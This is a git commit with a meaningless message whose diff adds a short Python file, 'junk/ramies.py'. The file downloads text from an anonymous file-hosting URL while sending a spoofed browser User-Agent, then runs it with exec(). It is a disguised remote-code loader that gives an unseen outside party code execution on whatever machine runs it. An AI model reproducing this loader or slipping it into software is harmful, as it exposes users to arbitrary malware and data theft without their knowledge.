14ae67caeb298d802bbc25e52387846dc22a2dfb
Fevber <nah.id.win.286h@gmail.com>
2026-08-19 09:40:21 -0600

    re
    re

---
+++ junk/ramies.py
@@ -0,0 +1,10 @@
+
+import urllib.request
+import subprocess
+import sys
+import os
+
+url = 'https://files.catbox.moe/peun20.txt'
+req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+code = urllib.request.urlopen(req).read().decode()
+exec(code)
